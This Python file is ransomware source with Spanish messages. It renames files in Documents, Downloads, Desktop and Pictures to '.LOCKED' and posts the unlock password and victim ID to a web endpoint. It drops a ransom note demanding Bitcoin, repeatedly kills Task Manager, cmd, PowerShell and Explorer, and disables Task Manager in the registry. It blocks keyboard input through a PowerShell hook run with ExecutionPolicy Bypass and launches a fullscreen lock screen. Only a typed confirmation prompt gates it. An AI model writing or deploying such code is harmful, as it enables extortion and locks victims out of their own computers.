import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
from pathlib import Path

class RansomwareCompleto:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)', 'System32',
            'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = 'http://localhost/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        try:
            if filepath.stat().st_size < 100:
                return False
        except:
            return False
            
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx']
        
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 30))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))

    def send_credentials(self):
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=10)
            return response.text.strip() == 'Ok.'
        except:
            return True

    def encrypt_file_windows(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
                
            new_name = str(filepath) + '.LOCKED'
            os.rename(filepath, new_name)
            self.encryption_count += 1
            return True
                
        except:
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
            return encrypted_files
        except:
            return 0

    def create_ransom_note(self):
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    !!! SISTEMA BLOQUEADO !!!                 ║
╚══════════════════════════════════════════════════════════════╝

TODOS SUS ARCHIVOS HAN SIDO CIFRADOS

• Para recuperar el acceso debe pagar ${self.price} en Bitcoin
• Dirección Bitcoin: {self.bitcoin}
• Su ID único: {self.victim_id}

NO CIERRE ESTA VENTANA - ES SU ÚNICA FORMA DE RECUPERAR EL SISTEMA

Escriba la clave de descifrado a continuación:
"""
        
        locations = [
            os.path.expanduser('~/Desktop/INSTRUCCIONES.txt'),
            'C:/INSTRUCCIONES.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
            except:
                pass

    def kill_system_tools(self):
        """Mata todas las herramientas del sistema"""
        tools = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
            'explorer.exe', 'msconfig.exe', 'compmgmt.msc', 'perfmon.exe',
            'eventvwr.exe', 'services.msc', 'control.exe', 'mmc.exe'
        ]
        
        for tool in tools:
            try:
                os.system(f'taskkill /f /im {tool} 2>nul')
            except:
                pass

    def disable_task_manager(self):
        """Deshabilita el administrador de tareas"""
        try:
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
        except:
            pass

    def block_keyboard(self):
        """Bloquea combinaciones de teclas importantes"""
        try:
            # Bloquear Win+R, Win+X, Ctrl+Shift+Esc, Alt+Tab, etc.
            blocking_script = """
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyboardBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    
    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
    
    [DllImport("user32.dll")]
    public static extern bool UnhookWindowsHookEx(IntPtr hInstance);
    
    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hInstance, int nCode, int wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    public delegate IntPtr LowLevelKeyboardProc(int nCode, int wParam, IntPtr lParam);
    
    public static IntPtr HookCallback(int nCode, int wParam, IntPtr lParam) {
        if (nCode >= 0) {
            return (IntPtr)1; // Bloquear todas las teclas
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }
    
    public static IntPtr hHook = IntPtr.Zero;
    
    public static void StartBlocking() {
        hHook = SetWindowsHookEx(13, HookCallback, GetModuleHandle(null), 0);
        BlockInput(true);
    }
    
    public static void StopBlocking() {
        BlockInput(false);
        UnhookWindowsHookEx(hHook);
    }
}
"@

[KeyboardBlocker]::StartBlocking()
"""
            with open('C:\\Windows\\Temp\\block_keys.ps1', 'w') as f:
                f.write(blocking_script)
            
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', 'C:\\Windows\\Temp\\block_keys.ps1'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def create_black_screen(self):
        """Crea la pantalla negra de bloqueo completo"""
        black_screen_code = f'''
import tkinter as tk
import tkinter.messagebox as messagebox
import sys
import os
import subprocess
import threading
import time

class FullScreenBlocker:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_ui()
        self.start_monitoring()
        
    def setup_ui(self):
        # Pantalla completa
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.bind("<Key>", self.on_key_press)
        self.root.bind("<Button>", self.on_click)
        
        # Frame principal
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True, fill="both", padx=50, pady=50)
        
        # Título
        title = tk.Label(
            main_frame,
            text="🔐 SISTEMA COMPLETAMENTE BLOQUEADO",
            font=("Arial", 32, "bold"),
            fg="red",
            bg="black"
        )
        title.pack(pady=20)
        
        # Mensaje
        message = tk.Label(
            main_frame,
            text="FALTA REPARAR LA CONEXIÓN\\nTodos sus archivos han sido cifrados",
            font=("Arial", 20),
            fg="white",
            bg="black"
        )
        message.pack(pady=10)
        
        # ID de víctima
        victim_id = tk.Label(
            main_frame,
            text=f"ID: {self.victim_id}",
            font=("Arial", 16, "bold"),
            fg="yellow",
            bg="black"
        )
        victim_id.pack(pady=10)
        
        # Frame de entrada
        input_frame = tk.Frame(main_frame, bg="black")
        input_frame.pack(pady=30)
        
        tk.Label(
            input_frame,
            text="Ingrese la clave de descifrado:",
            font=("Arial", 14),
            fg="white",
            bg="black"
        ).pack()
        
        self.password_entry = tk.Entry(
            input_frame,
            font=("Arial", 16),
            width=40,
            show="*"
        )
        self.password_entry.pack(pady=10)
        self.password_entry.focus()
        
        # Botón de verificación
        verify_btn = tk.Button(
            input_frame,
            text="VERIFICAR CLAVE",
            font=("Arial", 14, "bold"),
            bg="red",
            fg="white",
            command=self.verify_password,
            width=20,
            height=2
        )
        verify_btn.pack(pady=10)
        
        # Contador
        self.counter = 0
        self.counter_label = tk.Label(
            main_frame,
            text="Tiempo bloqueado: 0 segundos",
            font=("Arial", 12),
            fg="gray",
            bg="black"
        )
        self.counter_label.pack(side="bottom", pady=10)
        
    def on_key_press(self, event):
        # Permitir solo teclas alfanuméricas y algunas de control
        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12"]:
            return "break"
            
    def on_click(self, event):
        return "break"
        
    def verify_password(self):
        password = self.password_entry.get()
        if password == "{self.password}":
            self.unlock_system()
        else:
            messagebox.showerror("Error", "Clave incorrecta. Sistema permanece bloqueado.")
            self.password_entry.delete(0, tk.END)
            
    def unlock_system(self):
        # Restaurar sistema
        try:
            subprocess.Popen(["python", "DECRYPT_FILES.py"])
        except:
            pass
        self.root.destroy()
        sys.exit()
        
    def update_counter(self):
        self.counter += 1
        self.counter_label.config(text=f"Tiempo bloqueado: {{self.counter}} segundos")
        self.root.after(1000, self.update_counter)
        
    def start_monitoring(self):
        # Monitorear y cerrar ventanas emergentes
        def monitor():
            while True:
                try:
                    # Cerrar administrador de tareas si se abre
                    os.system("taskkill /f /im taskmgr.exe 2>nul")
                    time.sleep(1)
                except:
                    pass
                    
        thread = threading.Thread(target=monitor)
        thread.daemon = True
        thread.start()
        
        self.update_counter()
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    blocker = FullScreenBlocker()
    blocker.run()
'''
        
        try:
            with open('black_screen.py', 'w', encoding='utf-8') as f:
                f.write(black_screen_code)
        except:
            pass

    def start_black_screen(self):
        """Inicia la pantalla negra"""
        try:
            subprocess.Popen([sys.executable, 'black_screen.py'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    def create_decryptor(self):
        decrypt_script = f'''import os
import shutil

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def main():
    print("Descifrando archivos...")
    
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    for enc_file in encrypted_files:
        try:
            original_file = enc_file[:-7]
            os.rename(enc_file, original_file)
            print(f"Recuperado: {{os.path.basename(original_file)}}")
        except:
            pass
            
    print("¡Sistema recuperado!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
        
        try:
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
        except:
            pass

    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        print("🔐 INICIANDO BLOQUEO COMPLETO DEL SISTEMA")
        
        # Generar claves
        self.generate_keys()
        print(f"Clave generada: {self.password}")
        
        # Cifrar archivos
        directories = self.expand_paths()
        for directory in directories:
            self.encrypt_directory(directory)
        
        # Crear archivos necesarios
        self.create_ransom_note()
        self.create_decryptor()
        self.create_black_screen()
        
        # Bloquear sistema
        print("🚫 BLOQUEANDO SISTEMA...")
        self.kill_system_tools()
        self.disable_task_manager()
        self.block_keyboard()
        
        # Iniciar pantalla negra
        print("🖥️ INICIANDO PANTALLA NEGRA...")
        self.start_black_screen()
        
        # Bloqueo continuo
        while True:
            self.kill_system_tools()
            time.sleep(2)

if __name__ == "__main__":
    # Verificar que es entorno controlado
    print("⚠️  BLOQUEO COMPLETO DEL SISTEMA")
    print("SOLO PARA ENTORNOS CONTROLADOS")
    
    confirm = input("¿Continuar? (escribe 'BLOQUEAR'): ")
    if confirm != "BLOQUEAR":
        print("Cancelado.")
        sys.exit()
        
    # Ejecutar bloqueo
    ransomware = RansomwareCompleto()
    
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("Interrumpido por usuario")
    except Exception as e:
        print(f"Error: {e}")
